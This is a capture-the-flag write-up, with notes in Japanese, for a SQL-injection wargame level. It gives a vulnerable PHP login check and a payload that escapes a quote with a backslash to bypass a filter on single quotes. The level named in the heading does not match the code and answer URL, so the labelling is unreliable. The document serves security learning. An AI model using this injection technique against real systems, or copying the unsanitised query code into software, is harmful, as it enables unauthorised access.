# zombie_assassin

## answer

```
https://los.eagle-jump.org/succubus_8ab2d195be2e0b10a3b5aa2873d0863f.php?id=1\&pw=||1--%20;
```

## problem

```
query : select id from prob_succubus where id='' and pw=''

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[id])) exit("HeHe"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("succubus"); 
  highlight_file(__FILE__); 
?>
```

## memo

```https://los.eagle-jump.org/zombie_assassin_14dfa83153eb348c4aea012d453e9c8a.php?id=1&pw=2``とかで試してみる。

```query : select id from prob_succubus where id='1' and pw='2'```となった。

コードを読んでいく。

```
if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
if(preg_match('/\'/i', $_GET[id])) exit("HeHe"); 
if(preg_match('/\'/i', $_GET[pw])) exit("HeHe");
```


全てのパラメータで```'```が禁じられているので、フィルターは結構厳しい気がする。
```'```を```\'```とエスケープシーケンスする方法を考えた。

```
?id=\&pw=||1-- ;
```

これにより、idパラメータを```1\' and pw=```とみなすことができるはずであり、
このあとに挿入する```||1-- ;```はフィルターを返さずsql文として実行できそうだ。

--のあとに空白（%20）が必要なので気をつけること。



## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [ereg | php manual](https://www.php.net/manual/ja/function.ereg.php)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)
